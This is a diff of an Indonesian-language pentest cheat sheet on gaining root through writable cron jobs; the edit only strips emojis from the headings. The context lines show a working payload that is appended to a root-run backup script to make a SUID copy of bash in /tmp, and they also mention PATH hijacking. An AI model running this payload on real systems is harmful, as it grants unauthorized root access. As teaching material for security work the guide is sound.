@@ -1,16 +1,16 @@
-# ⏰ Writable Cron (Privilege Escalation via Cron Job)
+﻿# Writable Cron (Privilege Escalation via Cron Job)
 
 > **Tujuan:** Memodifikasi **cron job** yang dijalankan sebagai **root** untuk mendapatkan **root shell** atau **root‑owned SUID binary**.
 
 ---
 
-## 📌 Penjelasan Singkat
+## Penjelasan Singkat
 
 Jika sebuah **cron job** menjalankan script yang **writable** oleh user biasa, attacker dapat menyisipkan payload yang akan dieksekusi sebagai **root** ketika cron berjalan.
 
 ---
 
-## 🛡️ Temukan Cron Jobs
+## Temukan Cron Jobs
 
 ```bash
 cat /etc/crontab
@@ -26,7 +26,7 @@ Perhatikan baris seperti:
 
 ---
 
-## 🔍 Cari Script Writable
+## Cari Script Writable
 
 ```bash
 ls -la /opt/backup.sh
@@ -44,7 +44,7 @@ User dalam group `developers` dapat menulis file ini.
 
 ---
 
-## 💥 Inject Payload
+## Inject Payload
 
 ```bash
 echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /opt/backup.sh
@@ -57,7 +57,7 @@ Payload di atas akan:
 
 ---
 
-## ⏳ Tunggu Cron Berjalan
+## Tunggu Cron Berjalan
 
 Tunggu cron dieksekusi (umumnya dalam 1 menit), lalu jalankan:
 
@@ -75,7 +75,7 @@ id
 
 ---
 
-## 🧨 PATH Hijacking
+## PATH Hijacking
 
 Cek juga apakah cron memanggil command **tanpa full path**. Misalnya:
 
@@ -99,7 +99,7 @@ Cron akan menjalankan `/tmp/backup.sh` (file attacker) alih‑alih `/usr/bin/bac
 
 ---
 
-## 🪜 Alur Eksploitasi
+## Alur Eksploitasi
 
 ```text
 Cari cron jobs
@@ -117,7 +117,7 @@ Verifikasi root
 
 ---
 
-## 📋 Checklist Writable Cron
+## Checklist Writable Cron
 
 - [ ] Inspect `/etc/crontab` dan `/etc/cron.d/`.
 - [ ] Identifikasi script yang dijalankan **root**.
@@ -130,7 +130,7 @@ Verifikasi root
 
 ---
 
-## 📚 Referensi
+## Referensi
 
 - [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
 - [GTFOBins – Shell Privilege Escalation](https://gtfobins.github.io/)
